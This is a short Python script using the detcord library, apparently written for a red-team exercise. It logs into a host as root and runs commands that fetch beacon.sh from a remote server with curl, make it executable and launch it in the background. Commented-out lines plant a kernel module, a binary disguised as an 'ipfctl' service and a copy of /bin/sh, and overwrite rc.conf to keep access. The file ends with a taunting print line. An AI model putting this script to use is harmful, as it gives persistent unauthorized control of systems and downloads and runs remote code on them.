from detcord import *
env = {}
#env["hosts"] = ['10.1.1.254','10.2.1.254','10.3.1.254','10.4.1.254','10.5.1.254','10.6.1.254','10.7.1.254','10.8.1.254','10.9.1.254','10.10.1.254','10.11.1.254','10.12.1.254','10.13.1.254','10.14.1.254','10.15.1.254','10.16.1.254']
env["hosts"] = ['10.2.1.254']
env["user"] = "root"
env["pass"] = "redteam"

@action
def deploy(host):
    #host.put("./dad.ko","/boot/dad.ko")
    #host.run("rm /boot/kernel/son")
    #host.put("./son","/boot/kernel/son")
    #host.run("chmod +x /boot/kernel/son")
    #host.put("./ipfctl.service","/etc/rc.d/ipfctl")
    #host.put("./ipfctl.sh", "/usr/local/etc/rc.d/ipfctl.sh")
    #host.run("chmod +x /usr/local/etc/rc.d/ipfctl.sh")
    #host.run("chmod +x /etc/rc.d/ipfctl")
    #host.run("cp /bin/sh /sbin/ipfctl")
    #host.run("kldload /boot/dad.ko")
    #host.run("echo 'ipfctl_enable=\"YES\"' > /etc/rc.conf")
    #host.run("service ipfctl start && service ipfctl enabled")
    host.run("curl http://172.16.128.17:8000/beacon.sh > /etc/beacon.sh")
    host.run("chmod +x /etc/beacon.sh")
    host.run("/bin/sh /etc/beacon.sh 10.2.1.254 &")


    print("You will never mess with me or my son again\n")
